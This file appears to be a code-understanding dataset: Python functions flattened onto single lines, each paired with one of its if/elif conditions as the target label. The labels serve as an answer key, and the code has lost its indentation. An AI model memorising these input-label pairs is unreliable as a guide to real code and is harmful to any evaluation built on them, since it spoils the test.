{"input": "def parse_bismark_report(self, report, regexes): \"\"\"Search a bismark report with a set of regexes\"\"\" parsed_data = {} for k, r in regexes.items(): r_search = re.search(r, report, re.MULTILINE) if r_search: try: parsed_data[k] = float(r_search.group(1)) except ValueError: parsed_data[k] = r_search.group(1) # NaN if len(parsed_data) == 0: return None return parsed_data", "label": "if r_search :"}
{"input": "def _scroll_delete(dirname, max_num_checkpoints=3): dirs = os.listdir(dirname) serial_map = {} for serial in dirs: serial_num = _get_dir_serial(serial) serial_map[serial_num] = serial if len(list(serial_map.keys())) <= max_num_checkpoints: return serials = list(serial_map.keys()) serials.sort(reverse=True) serials = serials[max_num_checkpoints:] for serial in serials: cur_dir = _get_serial_dir(dirname, serial) try: shutil.rmtree(cur_dir) except OSError as err: if err.errno != errno.ENOENT: raise err", "label": "if err . errno != errno . ENOENT :"}
{"input": "def _lookup(self, key, dicts=None, filters=()): if dicts is None: dicts = self.dicts key_len = len(key) if key_len > self.longest_key: return None for d in dicts: if not d.enabled: continue if key_len > d.longest_key: continue value = d.get(key) if value: for f in filters: if f(key, value): return None return value", "label": "if not d . enabled :"}
{"input": "def get_preset(self, unit): for line in self._lines: m = re.match(r\"(enable|disable)\\s+(\\S+)\", line) if m: status, pattern = m.group(1), m.group(2) if fnmatch.fnmatchcase(unit, pattern): logg.debug(\"%s %s => %s [%s]\", status, pattern, unit, self.filename()) return status return None", "label": "if m :"}
{"input": "def gen_cpu_name(cpu): if cpu == \"simple\": return event_download.get_cpustr() for j in known_cpus: if cpu == j[0]: if isinstance(j[1][0], tuple): return \"GenuineIntel-6-%02X-%d\" % j[1][0] else: return \"GenuineIntel-6-%02X\" % j[1][0] assert False", "label": "if cpu == j [ 0 ] :"}
{"input": "def allow_request(self, request, view): if settings.API_THROTTLING: request_allowed = super(GranularUserRateThrottle, self).allow_request( request, view ) if not request_allowed: user = getattr(request, \"user\", None) if user and request.user.is_authenticated: log.info(\"User %s throttled for scope %s\", request.user, self.scope) ActivityLog.create(amo.LOG.THROTTLED, self.scope, user=user) return request_allowed else: return True", "label": "if not request_allowed :"}
{"input": "def __getitem__(self, tagSet): try: return self.__presentTypes[tagSet] except KeyError: if self.__defaultType is None: raise KeyError() elif tagSet in self.__skipTypes: raise error.PyAsn1Error(\"Key in negative map\") else: return self.__defaultType", "label": "if self . __defaultType is None :"}
{"input": "def _media(self): # Get the media property of the superclass, if it exists sup_cls = super(cls, self) try: base = sup_cls.media except AttributeError: base = Media() # Get the media definition for this class definition = getattr(cls, \"Media\", None) if definition: extend = getattr(definition, \"extend\", True) if extend: if extend == True: m = base else: m = Media() for medium in extend: m = m + base[medium] return m + Media(definition) else: return Media(definition) else: return base", "label": "if extend == True :"}
{"input": "def ascii85decode(data): n = b = 0 out = \"\" for c in data: if \"!\" <= c and c <= \"u\": n += 1 b = b * 85 + (ord(c) - 33) if n == 5: out += struct.pack(\">L\", b) n = b = 0 elif c == \"z\": assert n == 0 out += \"\\0\\0\\0\\0\" elif c == \"~\": if n: for _ in range(5 - n): b = b * 85 + 84 out += struct.pack(\">L\", b)[: n - 1] break return out", "label": "elif c == \"~\" :"}
{"input": "def get_max_shape(data): if isinstance(data, dict): max = 0 val = None for k, v in data.items(): tmp = reduce(lambda x, y: x * y, v.shape) if tmp > max: val = v.shape max = tmp return val else: return data[0].shape", "label": "if tmp > max :"}
{"input": "def _subscribe_core( self, observer: typing.Observer, scheduler: Optional[typing.Scheduler] = None ) -> typing.Disposable: with self.lock: self.check_disposed() if not self.is_stopped: self.observers.append(observer) return InnerSubscription(self, observer) ex = self.exception has_value = self.has_value value = self.value if ex: observer.on_error(ex) elif has_value: observer.on_next(value) observer.on_completed() else: observer.on_completed() return Disposable()", "label": "if not self . is_stopped :"}
{"input": "def ratio(self, outevent, inevent): assert outevent not in self assert inevent in self for function in compat_itervalues(self.functions): assert outevent not in function assert inevent in function function[outevent] = ratio(function[inevent], self[inevent]) for call in compat_itervalues(function.calls): assert outevent not in call if inevent in call: call[outevent] = ratio(call[inevent], self[inevent]) self[outevent] = 1.0", "label": "if inevent in call :"}
{"input": "def _format_changelog(self, changelog): \"\"\"Format the changelog correctly and convert it to a list of strings\"\"\" if not changelog: return changelog new_changelog = [] for line in changelog.strip().split(\"\\n\"): line = line.strip() if line[0] == \"*\": new_changelog.extend([\"\", line]) elif line[0] == \"-\": new_changelog.append(line) else: new_changelog.append(\" \" + line) # strip trailing newline inserted by first changelog entry if not new_changelog[0]: del new_changelog[0] return new_changelog", "label": "elif line [ 0 ] == \"-\" :"}
{"input": "def _set_base64md5(self, value): if value: if not isinstance(value, six.string_types): value = value.decode(\"utf-8\") self.local_hashes[\"md5\"] = binascii.a2b_base64(value) elif \"md5\" in self.local_hashes: del self.local_hashes[\"md5\"]", "label": "if not isinstance ( value , six . string_types ) :"}
{"input": "def setGeometry(self, rect): \"\"\"Set the window geometry, but only once when using the qttabs gui.\"\"\" if g.app.qt_use_tabs: m = self.leo_master assert self.leo_master # Only set the geometry once, even for new files. if not hasattr(m, \"leo_geom_inited\"): m.leo_geom_inited = True self.leo_master.setGeometry(rect) QtWidgets.QMainWindow.setGeometry(self, rect) else: QtWidgets.QMainWindow.setGeometry(self, rect)", "label": "if not hasattr ( m , \"leo_geom_inited\" ) :"}
{"input": "def _get_extension_suppressions(mod_loaders): res = [] for m in mod_loaders: suppressions = getattr(m, \"suppress_extension\", None) if suppressions: suppressions = ( suppressions if isinstance(suppressions, list) else [suppressions] ) for sup in suppressions: if isinstance(sup, ModExtensionSuppress): res.append(sup) return res", "label": "if isinstance ( sup , ModExtensionSuppress ) :"}
{"input": "def _check_positional(results): positional = None for name, char in results: if positional is None: positional = name is None else: if (name is None) != positional: raise TranslationError( \"format string mixes positional \" \"and named placeholders\" ) return bool(positional)", "label": "if ( name is None ) != positional :"}
{"input": "def ascii85decode(data): n = b = 0 out = \"\" for c in data: if \"!\" <= c and c <= \"u\": n += 1 b = b * 85 + (ord(c) - 33) if n == 5: out += struct.pack(\">L\", b) n = b = 0 elif c == \"z\": assert n == 0 out += \"\\0\\0\\0\\0\" elif c == \"~\": if n: for _ in range(5 - n): b = b * 85 + 84 out += struct.pack(\">L\", b)[: n - 1] break return out", "label": "elif c == \"z\" :"}
{"input": "def __getattr__(self, name): # if the aval property raises an AttributeError, gets caught here assert skip_checks or name != \"aval\" try: attr = getattr(self.aval, name) except KeyError as err: raise AttributeError( \"{} has no attribute {}\".format(self.__class__.__name__, name) ) from err else: t = type(attr) if t is aval_property: return attr.fget(self) elif t is aval_method: return types.MethodType(attr.fun, self) else: return attr", "label": "if t is aval_property :"}
{"input": "def build_vocab(self, filename): EOS = \"</eos>\" vocab_dict = {} ids = 0 vocab_dict[EOS] = ids ids += 1 with open(filename, \"r\") as f: for line in f.readlines(): for w in line.strip().split(): if w not in vocab_dict: vocab_dict[w] = ids ids += 1 self.vocab_size = ids return vocab_dict", "label": "if w not in vocab_dict :"}
{"input": "def eval_dummy_genomes_iznn(genomes, config): for genome_id, genome in genomes: net = neat.iznn.IZNN.create(genome, config) if genome_id < 10: net.reset() genome.fitness = 0.0 elif genome_id <= 150: genome.fitness = 0.5 else: genome.fitness = 1.0", "label": "elif genome_id <= 150 :"}
{"input": "def _add_csrf(self, without_csrf, explicit_csrf=None): parts = urlparse(without_csrf) query = parse_qs(parts[4]) with self.app.session_transaction() as sess: if explicit_csrf is not None: query[CSRF_TOKEN_KEY] = explicit_csrf else: sess[CSRF_TOKEN_KEY] = \"something\" query[CSRF_TOKEN_KEY] = sess[CSRF_TOKEN_KEY] return urlunparse(list(parts[0:4]) + [urlencode(query)] + list(parts[5:]))", "label": "if explicit_csrf is not None :"}
{"input": "def test_confirm_extension_is_yml(self): files_with_incorrect_extensions = [] for file in self.yield_next_rule_file_path(self.path_to_rules): file_name_and_extension = os.path.splitext(file) if len(file_name_and_extension) == 2: extension = file_name_and_extension[1] if extension != \".yml\": files_with_incorrect_extensions.append(file) self.assertEqual( files_with_incorrect_extensions, [], Fore.RED + \"There are rule files with extensions other than .yml\", )", "label": "if len ( file_name_and_extension ) == 2 :"}
{"input": "def _handle_eof(self, m): self.lock.acquire() try: if not self.eof_received: self.eof_received = True self.in_buffer.close() self.in_stderr_buffer.close() if self._pipe is not None: self._pipe.set_forever() finally: self.lock.release() self._log(DEBUG, \"EOF received ({})\".format(self._name))", "label": "if self . _pipe is not None :"}
{"input": "def do_close(self): if self.flags is not None and (self.flags == \"c\" or self.flags == \"w\"): if self._is_new: insert = self.table.insert() self.bind.execute( insert, namespace=self.namespace, data=self.hash, accessed=datetime.now(), created=datetime.now(), ) self._is_new = False else: update = self.table.update(self.table.c.namespace == self.namespace) self.bind.execute(update, data=self.hash, accessed=datetime.now()) self.flags = None", "label": "if self . _is_new :"}
{"input": "def __init__(self, sh_cmd, title=None, env=None, d=None): self.command = d and d.getVar(\"OE_TERMINAL_CUSTOMCMD\") if self.command: if not \"{command}\" in self.command: self.command += \" {command}\" Terminal.__init__(self, sh_cmd, title, env, d) logger.warn(\"Custom terminal was started.\") else: logger.debug(1, \"No custom terminal (OE_TERMINAL_CUSTOMCMD) set\") raise UnsupportedTerminal(\"OE_TERMINAL_CUSTOMCMD not set\")", "label": "if not \"{command}\" in self . command :"}
{"input": "def __code_color(self, code): if code in self.last_dist.keys(): if int(code) == 0: return self.screen.markup.GREEN elif int(code) == 314: return self.screen.markup.MAGENTA else: return self.screen.markup.RED else: return \"\"", "label": "if int ( code ) == 0 :"}
{"input": "def _calc_benchmark_stat(self, f): timer = Timer() i = 0 while True: f() i += 1 if i >= self.min_run: _, elapsed = timer.lap() if elapsed > self.min_time: break return BenchmarkStat(elapsed / i, i)", "label": "if elapsed > self . min_time :"}
{"input": "def _get_user_call_site(): import traceback stack = traceback.extract_stack(sys._getframe()) for i in range(1, len(stack)): callee_path = stack[i][STACK_FILE_NAME] if src_dir == os.path.dirname(os.path.abspath(callee_path)): caller_path = stack[i - 1][STACK_FILE_NAME] caller_lineno = stack[i - 1][STACK_LINE_NUM] dpark_func_name = stack[i][STACK_FUNC_NAME] user_call_site = \"%s:%d \" % (caller_path, caller_lineno) return dpark_func_name, user_call_site return \"<func>\", \" <root>\"", "label": "if src_dir == os . path . dirname ( os . path . abspath ( callee_path ) ) :"}
{"input": "def compact_repr(record): parts = [] for key in record.__attributes__: value = getattr(record, key) if not value: continue if isinstance(value, list): value = HIDE_LIST elif key == FEATS: value = format_feats(value) else: value = repr(value) value = capped_str(value) parts.append(\"%s=%s\" % (key, value)) return \"%s(%s)\" % (record.__class__.__name__, \", \".join(parts))", "label": "if not value :"}
{"input": "def get_tools(self, found_files): self.configured_by = {} runners = [] for tool_name in self.tools_to_run: tool = tools.TOOLS[tool_name]() config_result = tool.configure(self, found_files) if config_result is None: configured_by = None messages = [] else: configured_by, messages = config_result if messages is None: messages = [] self.configured_by[tool_name] = configured_by self.messages += messages runners.append(tool) return runners", "label": "if config_result is None :"}
{"input": "def erase_previous(self): if self.prev: length = len(self.prev) if self.prev[-1] in (\"\\n\", \"\\r\"): length = length - 1 self.write(\" \" * length + \"\\r\") self.prev = \"\"", "label": "if self . prev [ - 1 ] in ( \"\\n\" , \"\\r\" ) :"}
{"input": "def __demo_mode_pause_if_active(self, tiny=False): if self.demo_mode: wait_time = settings.DEFAULT_DEMO_MODE_TIMEOUT if self.demo_sleep: wait_time = float(self.demo_sleep) if not tiny: time.sleep(wait_time) else: time.sleep(wait_time / 3.4) elif self.slow_mode: self.__slow_mode_pause_if_active()", "label": "if self . demo_sleep :"}
{"input": "def pack_remaining_length(remaining_length): s = \"\" while True: byte = remaining_length % 128 remaining_length = remaining_length // 128 # If there are more digits to encode, set the top bit of this digit if remaining_length > 0: byte = byte | 0x80 s = s + struct.pack(\"!B\", byte) if remaining_length == 0: return s", "label": "if remaining_length == 0 :"}
{"input": "def _get_definitions(self, schema, query): results, error = self.run_query(query, None) if error is not None: raise Exception(\"Failed getting schema.\") results = json_loads(results) for row in results[\"rows\"]: if row[\"TABLE_SCHEMA\"] != \"public\": table_name = \"{}.{}\".format(row[\"TABLE_SCHEMA\"], row[\"TABLE_NAME\"]) else: table_name = row[\"TABLE_NAME\"] if table_name not in schema: schema[table_name] = {\"name\": table_name, \"columns\": []} schema[table_name][\"columns\"].append(row[\"COLUMN_NAME\"])", "label": "if table_name not in schema :"}
{"input": "def _parsed_config_to_dict(config): config_dict = {} for section in config.keys(): if section == \"DEFAULT\": continue config_dict[section] = {} for option in config[section].keys(): config_dict[section][option] = config[section][option] return config_dict", "label": "if section == \"DEFAULT\" :"}
{"input": "def escape_string(self, value): value = EscapedString.promote(value) value = value.expanduser() result = \"\" for is_literal, txt in value.strings: if is_literal: txt = pipes.quote(txt) if not txt.startswith(\"'\"): txt = \"'%s'\" % txt else: txt = txt.replace(\"\\\\\", \"\\\\\\\\\") txt = txt.replace('\"', '\\\\\"') txt = '\"%s\"' % txt result += txt return result", "label": "if not txt . startswith ( \"'\" ) :"}
{"input": "def sendMessage(self, text, meta=None): if self.account.client is None: raise locals.OfflineError for line in text.split(\"\\n\"): if meta and meta.get(\"style\", None) == \"emote\": self.account.client.ctcpMakeQuery(self.name, [(\"ACTION\", line)]) else: self.account.client.msg(self.name, line) return succeed(text)", "label": "if meta and meta . get ( \"style\" , None ) == \"emote\" :"}
{"input": "def clean_email(self): email = self.cleaned_data.get(\"email\") if self.instance.id: if self.instance.email != email: if not User.objects.filter(email=self.cleaned_data.get(\"email\")).exists(): return self.cleaned_data.get(\"email\") raise forms.ValidationError(\"Email already exists\") else: return self.cleaned_data.get(\"email\") else: if not User.objects.filter(email=self.cleaned_data.get(\"email\")).exists(): return self.cleaned_data.get(\"email\") raise forms.ValidationError(\"User already exists with this email\")", "label": "if self . instance . email != email :"}
{"input": "def render_checks(cr, size, nchecks): \"\"\"Render a checquerboard pattern to a cairo surface\"\"\" cr.set_source_rgb(*gui.style.ALPHA_CHECK_COLOR_1) cr.paint() cr.set_source_rgb(*gui.style.ALPHA_CHECK_COLOR_2) for i in xrange(0, nchecks): for j in xrange(0, nchecks): if (i + j) % 2 == 0: continue cr.rectangle(i * size, j * size, size, size) cr.fill()", "label": "if ( i + j ) % 2 == 0 :"}
{"input": "def seek(self, timestamp, log=True): \"\"\"Seek to a particular timestamp in the movie.\"\"\" if self.status in [PLAYING, PAUSED]: player = self._player if player and player.is_seekable(): player.set_time(int(timestamp * 1000.0)) self._vlc_clock.reset(timestamp) if self.status == PAUSED: self._pause_time = timestamp if log: logAttrib(self, log, \"seek\", timestamp)", "label": "if player and player . is_seekable ( ) :"}
{"input": "def class_results_to_node(key, elements): title = attributetabletitle(key, key) ul = nodes.bullet_list(\"\") for element in elements: ref = nodes.reference( \"\", \"\", internal=True, refuri=\"#\" + element.fullname, anchorname=\"\", *[nodes.Text(element.label)] ) para = addnodes.compact_paragraph(\"\", \"\", ref) if element.badge is not None: ul.append(attributetable_item(\"\", element.badge, para)) else: ul.append(attributetable_item(\"\", para)) return attributetablecolumn(\"\", title, ul)", "label": "if element . badge is not None :"}
{"input": "def parse_function(self, l): bracket = l.find(\"(\") fname = l[8:bracket] if self.properties: if self.properties[0] == \"propget\": self.props[fname] = 1 self.propget[fname] = 1 elif self.properties[0] == \"propput\": self.props[fname] = 1 self.propput[fname] = 1 else: self.functions[fname] = 1 self.properties = None", "label": "elif self . properties [ 0 ] == \"propput\" :"}
{"input": "def _slurp_from_queue(self, task_id, accept, limit=1000, no_ack=False): with self.app.pool.acquire_channel(block=True) as (_, channel): binding = self._create_binding(task_id)(channel) binding.declare() for _ in range(limit): msg = binding.get(accept=accept, no_ack=no_ack) if not msg: break yield msg else: raise self.BacklogLimitExceeded(task_id)", "label": "if not msg :"}
{"input": "def analyse_text(text): if re.search(r\"^\\s*model\\s*\\{\", text, re.M): if re.search(r\"^\\s*data\\s*\\{\", text, re.M): return 0.9 elif re.search(r\"^\\s*var\", text, re.M): return 0.9 else: return 0.3 else: return 0", "label": "elif re . search ( r\"^\\s*var\" , text , re . M ) :"}
{"input": "def wait_for_step(self, error_buffer=None, timeout=None): # TODO: this might be cleaner using channels with self.cv: start = time.time() while True: if self.count != 0: return elif timeout is not None and time.time() - start > timeout: raise error.Error(\"No rewards received in {}s\".format(timeout)) if error_buffer: error_buffer.check() self.cv.wait(timeout=0.5)", "label": "if self . count != 0 :"}
{"input": "def TestDictAgainst(dict, check): for key, value in check.iteritems(): if dict(key) != value: raise error( \"Indexing for '%s' gave the incorrect value - %s/%s\" % (repr(key), repr(dict[key]), repr(check[key])) )", "label": "if dict ( key ) != value :"}
{"input": "def callback(username, password, msg): self.add_channel() if hasattr(self, \"_closed\") and not self._closed: self.attempted_logins += 1 if self.attempted_logins >= self.max_login_attempts: msg += \" Disconnecting.\" self.respond(\"530 \" + msg) self.close_when_done() else: self.respond(\"530 \" + msg) self.log(\"USER '%s' failed login.\" % username) self.on_login_failed(username, password)", "label": "if self . attempted_logins >= self . max_login_attempts :"}
{"input": "def handle_disconnect(self): \"\"\"Socket gets disconnected\"\"\" # signal disconnected terminal with control lines try: self.serial.rts = False self.serial.dtr = False finally: # restore original port configuration in case it was changed self.serial.apply_settings(self.serial_settings_backup) # stop RFC 2217 state machine self.rfc2217 = None # clear send buffer self.buffer_ser2net = bytearray() # close network connection if self.socket is not None: self.socket.close() self.socket = None if self.log is not None: self.log.warning(\"{}: Disconnected\".format(self.device))", "label": "if self . socket is not None :"}
{"input": "def select_invitation_id_for_network(invitations, networkid, status=None): # Get invitations based on network and maybe status invitationsfornetwork = [] for invitation in invitations: if invitation[\"NetworkSummary\"][\"Id\"] == networkid: if status is None or invitation[\"Status\"] == status: invitationsfornetwork.append(invitation[\"InvitationId\"]) return invitationsfornetwork", "label": "if invitation [ \"NetworkSummary\" ] [ \"Id\" ] == networkid :"}
{"input": "def fit(self, refstring, subpipes): if not isinstance(subpipes, list): subpipes = [subpipes] for subpipe in subpipes: if hasattr(subpipe, \"transform\"): substring = subpipe.transform(None) else: substring = subpipe self._scores.append( ( self.base_aligner.fit_transform(refstring, substring, get_score=True), subpipe, ) ) return self", "label": "if hasattr ( subpipe , \"transform\" ) :"}
{"input": "def build_priorities(self, _iter, priorities): while _iter is not None: if self.files_treestore.iter_has_child(_iter): self.build_priorities(self.files_treestore.iter_children(_iter), priorities) elif not self.files_treestore.get_value(_iter, 1).endswith(os.path.sep): priorities[ self.files_treestore.get_value(_iter, 3) ] = self.files_treestore.get_value(_iter, 0) _iter = self.files_treestore.iter_next(_iter) return priorities", "label": "if self . files_treestore . iter_has_child ( _iter ) :"}
{"input": "def __init__(self, fileobj, info): pages = [] complete = False while not complete: page = OggPage(fileobj) if page.serial == info.serial: pages.append(page) complete = page.complete or (len(page.packets) > 1) packets = OggPage.to_packets(pages) if not packets: raise error(\"Missing metadata packet\") data = packets[0][7:] super(OggTheoraCommentDict, self).__init__(data, framing=False) self._padding = len(data) - self._size", "label": "if page . serial == info . serial :"}
{"input": "def _run_interface(self, runtime): mel_icas = [] for item in self.inputs.mel_icas_in: if os.path.exists(os.path.join(item, \"hand_labels_noise.txt\")): mel_icas.append(item) if len(mel_icas) == 0: raise Exception( \"%s did not find any hand_labels_noise.txt files in the following directories: %s\" % (self.__class__.__name__, mel_icas) ) return runtime", "label": "if os . path . exists ( os . path . join ( item , \"hand_labels_noise.txt\" ) ) :"}
{"input": "def download_file(url, file): try: xlog.info(\"download %s to %s\", url, file) req = opener.open(url) CHUNK = 16 * 1024 with open(file, \"wb\") as fp: while True: chunk = req.read(CHUNK) if not chunk: break fp.write(chunk) return True except: xlog.info(\"download %s to %s fail\", url, file) return False", "label": "if not chunk :"}
{"input": "def check_sales_order_on_hold_or_close(self, ref_fieldname): for d in self.get(\"items\"): if d.get(ref_fieldname): status = frappe.db.get_value(\"Sales Order\", d.get(ref_fieldname), \"status\") if status in (\"Closed\", \"On Hold\"): frappe.throw( _(\"Sales Order {0} is {1}\").format(d.get(ref_fieldname), status) )", "label": "if status in ( \"Closed\" , \"On Hold\" ) :"}
{"input": "def iterstack(sources, missing, trim, pad): its = [iter(t) for t in sources] hdrs = [next(it) for it in its] hdr = hdrs[0] n = len(hdr) yield tuple(hdr) for it in its: for row in it: outrow = tuple(row) if trim: outrow = outrow[:n] if pad and len(outrow) < n: outrow += (missing,) * (n - len(outrow)) yield outrow", "label": "if trim :"}
{"input": "def __call__(self, response_headers): rates = get_rates_from_response_headers(response_headers) if rates: time.sleep( self._get_wait_time( rates.short_usage, rates.long_usage, get_seconds_until_next_quarter(), get_seconds_until_next_day(), ) ) if not self.force_limits: self.short_limit = rates.short_limit self.long_limit = rates.long_limit", "label": "if not self . force_limits :"}
{"input": "def main(self): self.model.clear() self.callman.unregister_all() active_handle = self.get_active(\"Place\") if active_handle: active = self.dbstate.db.get_place_from_handle(active_handle) if active: self.display_place(active, None, [active_handle], DateRange()) else: self.set_has_data(False) else: self.set_has_data(False)", "label": "if active :"}
{"input": "def node_exists(self, jid=None, node=None, ifrom=None): with self.lock: if jid is None: jid = self.xmpp.boundjid.full if node is None: node = \"\" if ifrom is None: ifrom = \"\" if isinstance(ifrom, JID): ifrom = ifrom.full if (jid, node, ifrom) not in self.nodes: return False return True", "label": "if ifrom is None :"}
{"input": "def append_to(project_url, destination): url = (\"%smagic/%s\" % (project_url, destination)).replace(\"\\\\\", \"/\") response = urllib2.urlopen(url) if response.getcode() == 200: with open(destination, \"r\") as dest: lines = \"\".join(dest.readlines()) content = response.read() if content in lines: print_out(\"IGNORED\", destination) return with open(destination, \"a\") as dest: dest.write(content) print_out(\"APPEND\", destination)", "label": "if content in lines :"}
{"input": "def close(self, invalidate=False): self.session.transaction = self._parent if self._parent is None: for connection, transaction, autoclose in set(self._connections.values()): if invalidate: connection.invalidate() if autoclose: connection.close() else: transaction.close() self._state = CLOSED self.session.dispatch.after_transaction_end(self.session, self) if self._parent is None: if not self.session.autocommit: self.session.begin() self.session = None self._connections = None", "label": "if not self . session . autocommit :"}
{"input": "def list_local_packages(path): \"\"\"Lists all local packages below a path that could be installed.\"\"\" rv = [] try: for filename in os.listdir(path): if os.path.isfile(os.path.join(path, filename, \"setup.py\")): rv.append(\"@\" + filename) except OSError: pass return rv", "label": "if os . path . isfile ( os . path . join ( path , filename , \"setup.py\" ) ) :"}
{"input": "def walk_dir(templates, dest, filter=None): l = [] for root, folders, files in os.walk(templates): for filename in files: if filename.endswith(\".pyc\") or (filter and filename not in filter): continue relative_dir = \".{0}\".format( os.path.split(os.path.join(root, filename).replace(templates, \"\"))[0] ) l.append((os.path.join(root, filename), os.path.join(dest, relative_dir))) return l", "label": "if filename . endswith ( \".pyc\" ) or ( filter and filename not in filter ) :"}
{"input": "def selectItemHelper(self, item, scroll): if self.frame.lockout: return w = self.treeWidget if item and item.IsOk(): self.frame.lockout = True try: w.SelectItem(item) if scroll: w.ScrollTo(item) finally: self.frame.lockout = False", "label": "if scroll :"}
{"input": "def validate_external(self, field): if hasattr(self, \"forum\"): if self.forum.topics.count() > 0: raise ValidationError( _( \"You cannot convert a forum that \" \"contains topics into an \" \"external link.\" ) )", "label": "if self . forum . topics . count ( ) > 0 :"}
{"input": "def add_help(self): \"Attach help functions for each of the parsed token handlers.\" for attrname, func in list(shell.BQLShell.__dict__.items()): if attrname[:3] != \"on_\": continue command_name = attrname[3:] setattr( self.__class__, \"help_{}\".format(command_name.lower()), lambda _, fun=func: print( textwrap.dedent(fun.__doc__).strip(), file=self.outfile ), )", "label": "if attrname [ : 3 ] != \"on_\" :"}
{"input": "def createFields(self): yield UInt8(self, \"tag\") yield UInt24(self, \"size\", \"Content size\") yield UInt24(self, \"timestamp\", \"Timestamp in millisecond\") yield NullBytes(self, \"reserved\", 4) size = self[\"size\"].value if size: if self.parser: for field in self.parser(self, size): yield field else: yield RawBytes(self, \"content\", size)", "label": "if self . parser :"}
{"input": "def migrate_model_field_data(Model): queryset = Model.objects.all().order_by(\"pk\") for batch_pks in queryset_in_batches(queryset): instances = [] batch = Model.objects.filter(pk__in=batch_pks) for instance in batch: if instance.content_json: instance.content_json = parse_to_editorjs(instance.content_json) instances.append(instance) Model.objects.bulk_update(instances, [\"content_json\"])", "label": "if instance . content_json :"}
{"input": "def _add_account(cfg, which): username = self._get_account(cfg) if ( username and ((username == only) or only is None) and cfg.auth_type == \"password\" ): if username in accounts: accounts[username][which] = cfg.host else: fingerprint = self._user_fingerprint(username) accounts[username] = { which: cfg.host, \"username\": username, \"policy\": self._get_policy(fingerprint), } if accounts[username][\"policy\"] is None: del accounts[username][\"policy\"]", "label": "if username in accounts :"}
{"input": "def update_msg_tags(self, msg_idx_pos, msg_info): tags = set(self.get_tags(msg_info=msg_info)) with self._lock: for tid in set(self.TAGS.keys()) - tags: self.TAGS[tid] -= set([msg_idx_pos]) for tid in tags: if tid not in self.TAGS: self.TAGS[tid] = set() self.TAGS[tid].add(msg_idx_pos)", "label": "if tid not in self . TAGS :"}
{"input": "def close(self, reason=\"protocol closed, reason unspecified\"): if self.connection: self.logger.debug(reason, self.connection.session()) # must be first otherwise we could have a loop caused by the raise in the below self.connection.close() self.connection = None self.peer.stats[\"down\"] = self.peer.stats.get(\"down\", 0) + 1 try: if self.peer.neighbor.api[\"neighbor-changes\"]: self.peer.reactor.processes.down(self.peer.neighbor, reason) except ProcessError: self.logger.debug( \"could not send notification of neighbor close to API\", self.connection.session(), )", "label": "if self . peer . neighbor . api [ \"neighbor-changes\" ] :"}
{"input": "def check_objects_exist(self, compare_id, raise_exc=True): for uid in convert_compare_id_to_list(compare_id): if not self.existence_quick_check(uid): if raise_exc: raise FactCompareException(\"{} not found in database\".format(uid)) return True return False", "label": "if not self . existence_quick_check ( uid ) :"}
{"input": "def on_double_click(self, event): # self.save_current_folder() path = self.get_selected_path() if path: kind = self.get_selected_kind() if kind == \"dir\": self.focus_into(path) else: self.log_frame.load_log(path) return \"break\" # avoid default action of opening the node", "label": "if kind == \"dir\" :"}
{"input": "def resolve_cloudtrail_payload(self, payload): sources = self.data.get(\"sources\", []) events = [] for e in self.data.get(\"events\"): if not isinstance(e, dict): events.append(e) event_info = CloudWatchEvents.get(e) if event_info is None: continue else: event_info = e events.append(e[\"event\"]) sources.append(event_info[\"source\"]) payload[\"detail\"] = {\"eventSource\": list(set(sources)), \"eventName\": events}", "label": "if not isinstance ( e , dict ) :"}
{"input": "def load_graph_session_from_ckpt(ckpt_path, sess_config, print_op=False): \"\"\"load graph and session from checkpoint file\"\"\" graph = tf.Graph() with graph.as_default(): # pylint: disable=not-context-manager sess = get_session(sess_config) with sess.as_default(): # pylint: disable=not-context-manager # Load the saved meta graph and restore variables saver = tf.train.import_meta_graph(\"{}.meta\".format(ckpt_path)) saver.restore(sess, ckpt_path) if print_op: print_ops(graph, prefix=\"load_graph_session_from_ckpt\") return graph, sess", "label": "if print_op :"}
{"input": "def _parseConfigFile(self, iniPath, createConfig=True): parser = SafeConfigParserUnicode(strict=False) if not os.path.isfile(iniPath): if createConfig: open(iniPath, \"w\").close() else: return parser.readfp(codecs.open(iniPath, \"r\", \"utf_8_sig\")) for section, options in list(self._iniStructure.items()): if parser.has_section(section): for option in options: if parser.has_option(section, option): self._config[option] = parser.get(section, option)", "label": "if parser . has_option ( section , option ) :"}
{"input": "def parse(self): while 1: l = self.f.readline() if not l: return l = l.strip() if l.startswith(\"[\"): self.parse_uuid(l) elif l.startswith(\"interface\") or l.startswith(\"dispinterface\"): self.parse_interface(l) elif l.startswith(\"coclass\"): self.parse_coclass(l)", "label": "elif l . startswith ( \"interface\" ) or l . startswith ( \"dispinterface\" ) :"}
{"input": "def encode(self): if not isinstance(self.expr, m2_expr.ExprInt): return False if not test_set_sf(self.parent, self.expr.size): return False value = int(self.expr) if value < 1 << self.l: self.parent.shift.value = 0 else: if value & 0xFFF: return False value >>= 12 if value >= 1 << self.l: return False self.parent.shift.value = 1 self.value = value return True", "label": "if value >= 1 << self . l :"}
{"input": "def _func_runner(self): _locals.thread = self try: self._final_result = self.target(*self.args, **self.kwargs) self._final_exc = None except BaseException as e: self._final_result = None self._final_exc = e if not isinstance(e, errors.CancelledError): log.warning(\"Unexpected exception in cancelled async thread\", exc_info=True) finally: self._request.set_result(None)", "label": "if not isinstance ( e , errors . CancelledError ) :"}
{"input": "def _set_dialect(self, value): if value is None: self._dialect = mac_eui48 else: if hasattr(value, \"word_size\") and hasattr(value, \"word_fmt\"): self._dialect = value else: raise TypeError(\"custom dialects should subclass mac_eui48!\")", "label": "if hasattr ( value , \"word_size\" ) and hasattr ( value , \"word_fmt\" ) :"}
{"input": "def fixup_namespace_packages(path_item, parent=None): \"\"\"Ensure that previously-declared namespace packages include path_item\"\"\" imp.acquire_lock() try: for package in _namespace_packages.get(parent, ()): subpath = _handle_ns(package, path_item) if subpath: fixup_namespace_packages(subpath, package) finally: imp.release_lock()", "label": "if subpath :"}
{"input": "def close_file_descriptor(self, fd): \"\"\"Attempt to close a file descriptor.\"\"\" start_timer = time.time() error = \"\" while True: try: fd.close() break except OSError as e: # Undoubtedly close() was called during a concurrent operation on the same file object. log.debug(\"Error closing file descriptor: %s\" % str(e)) time.sleep(0.5) current_wait_time = time.time() - start_timer if current_wait_time >= 600: error = \"Error closing file descriptor: %s\" % str(e) break return error", "label": "if current_wait_time >= 600 :"}
{"input": "def p_constant(self, p): \"\"\"constant : PP_NUMBER\"\"\" value = p[1].rstrip(\"LlUu\") try: if value[:2] == \"0x\": value = int(value[2:], 16) elif value[0] == \"0\": value = int(value, 8) else: value = int(value) except ValueError: value = value.rstrip(\"eEfF\") try: value = float(value) except ValueError: value = 0 p[0] = ConstantExpressionNode(value)", "label": "elif value [ 0 ] == \"0\" :"}
